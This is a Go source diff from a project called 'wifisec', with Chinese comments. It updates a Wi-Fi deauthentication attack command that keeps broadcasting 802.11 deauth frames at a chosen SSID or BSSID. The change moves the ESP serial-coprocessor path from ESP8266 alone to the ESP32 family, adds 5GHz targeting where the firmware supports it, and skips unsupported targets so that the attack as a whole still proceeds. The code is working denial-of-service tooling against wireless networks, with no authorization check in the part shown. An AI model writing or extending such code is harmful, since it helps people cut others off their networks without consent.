@@ -11,7 +11,7 @@ import (
 	"time"
 	"wifisec/internal/constants"
 	"wifisec/internal/ieee80211"
-	platformesp "wifisec/internal/platform/esp8266"
+	platformesp "wifisec/internal/platform/esp"
 	platformlinux "wifisec/internal/platform/linux"
 	platformwindows "wifisec/internal/platform/windows"
 	"wifisec/internal/security"
@@ -43,7 +43,7 @@ type deauthTarget struct {
 // WifiDeauther 对指定 SSID/BSSID 的 AP 持续广播 802.11 deauthentication 帧。
 // 用法：wifisec deauth <ssid|bssid> [iface|串口]
 //
-// EMBEDDED_MODE 为 true 时走 ESP8266 串口协处理器路径，与宿主机平台无关，
+// EMBEDDED_MODE 为 true 时走 ESP 串口协处理器路径，与宿主机平台无关，
 // 也无需 root/管理员权限；为 false 时按平台分发：
 // Linux/Termux 走内核 AF_PACKET，Windows 走 Npcap 驱动，
 // macOS 系统层面不开放帧注入，只能给出精确的技术说明。
@@ -64,10 +64,11 @@ func WifiDeauther(arguments []string) error {
 	}
 }
 
-// deauthESP 走 ESP8266 串口协处理器路径。
+// deauthESP 走 ESP 串口协处理器路径（ESP8266 / ESP32 全系）。
 // 射频在板载芯片上，宿主机只发串口命令，因此任何平台、无 root 皆可运行；
 // 第二位置参数为串口名，缺省时自动枚举唯一 USB 串口。
-// 硬性约束：ESP8266 仅支持 2.4GHz（信道 1-14），5/6GHz 目标会被明确拒绝。
+// 频段能力以固件握手上报的能力位图为准：多数芯片仅 2.4GHz，
+// ESP32-C5 额外支持 5GHz，超出能力的目标逐条跳过并告警。
 func deauthESP(arguments []string) error {
 	target, targetMAC, portName, err := parseDeauthArgs(arguments)
 	if err != nil {
@@ -89,20 +90,35 @@ func deauthESP(arguments []string) error {
 	}
 	defer injector.Close()
 
-	utilities.Info("通过 %s 扫描周边 2.4GHz 网络…", portName)
+	// 频段提示以固件能力位图为准，而不是宿主机猜测板型。
+	band := "2.4GHz"
+	if injector.Supports5GHz() {
+		band = "2.4/5GHz"
+	}
+	utilities.Info("协处理器就绪（协议 v%d · %s），通过 %s 扫描周边网络…", injector.FirmwareVersion(), band, portName)
 
 	scanned, err := injector.Scan()
 	if err != nil {
-		return fmt.Errorf("ESP8266 扫描失败：%w", err)
+		return fmt.Errorf("协处理器扫描失败：%w", err)
 	}
 
 	targets := selectESPTargets(scanned, target, targetMAC)
 	if len(targets) == 0 {
-		return fmt.Errorf("未找到目标 %s；注意 ESP8266 仅支持 2.4GHz，5/6GHz 网络不可见", target)
+		if injector.Supports5GHz() {
+			return fmt.Errorf("未找到目标 %s，请确认 SSID/BSSID 正确且目标在信号范围内", target)
+		}
+		return fmt.Errorf("未找到目标 %s；当前协处理器仅支持 2.4GHz，5/6GHz 网络不可见", target)
 	}
 
 	deauthTargets := make([]deauthTarget, 0, len(targets))
 	for _, ap := range targets {
+		// 同名 SSID 可能同时存在 2.4GHz 与 5GHz 的 AP；
+		// 超出固件能力的信道逐目标跳过，而不是让整个攻击失败。
+		if ap.Channel > 14 && !injector.Supports5GHz() {
+			utilities.Warn("目标 %s 位于 5GHz 信道 %d，当前协处理器不支持，已跳过", ap.BSSID, ap.Channel)
+			continue
+		}
+
 		bssid, err := net.ParseMAC(ap.BSSID)
 		if err != nil {
 			utilities.Warn("目标 BSSID 格式异常，已跳过：%s", ap.BSSID)
